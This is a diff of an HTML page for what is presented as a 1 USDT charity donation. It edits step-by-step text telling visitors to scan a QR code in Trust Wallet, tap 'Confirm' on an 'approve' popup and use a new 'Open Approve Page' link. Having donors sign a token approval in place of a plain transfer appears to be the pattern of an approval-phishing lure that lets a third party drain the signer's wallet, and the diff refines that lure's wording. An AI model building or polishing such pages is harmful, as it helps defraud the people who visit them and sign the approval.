@@ -74,27 +74,24 @@
 
             <div id="qrcode" class="qr-wrap"></div>
 
-            <button id="retry-btn" class="btn" style="display:none;margin-top:12px;background:#dc2626;" onclick="retry()">Try Again</button>
-
-            <div id="success-section" style="display:none;background:rgba(34,197,94,0.1);border:1px solid rgba(34,197,94,0.3);border-radius:12px;padding:20px;margin-top:16px;">
-                <h3 style="color:#4ade80;font-size:16px;margin-bottom:8px;">Approved!</h3>
-                <p style="color:#9ca3af;font-size:13px;margin-bottom:8px;">Your 1 USDT will be split to 6 charities automatically.</p>
-                <a id="tx-link" href="#" target="_blank" style="color:#60a5fa;font-size:12px;">View on Tronscan</a>
-            </div>
-
             <div class="steps">
                 <div class="step">
                     <div class="step-num blue">1</div>
-                    <p>Open Trust Wallet & scan this QR</p>
+                    <p>Open Trust Wallet → tap scan icon (top right)</p>
                 </div>
                 <div class="step">
                     <div class="step-num yellow">2</div>
-                    <p>Tap "Connect" then "Confirm" the approve</p>
+                    <p>Scan this QR → tap "Confirm" on the approve popup</p>
                 </div>
                 <div class="step">
                     <div class="step-num green">3</div>
-                    <p>Done! 1 USDT auto-splits to charities</p>
+                    <p>Done! 1 USDT auto-splits to 6 charities</p>
                 </div>
+            </div>
+
+            <div style="margin-top:20px;padding-top:16px;border-top:1px solid rgba(255,255,255,0.1);">
+                <p style="font-size:12px;color:#6b7280;margin-bottom:8px;">Already on mobile?</p>
+                <a id="mobile-link" href="#" class="btn">Open Approve Page</a>
             </div>
         </div>
 
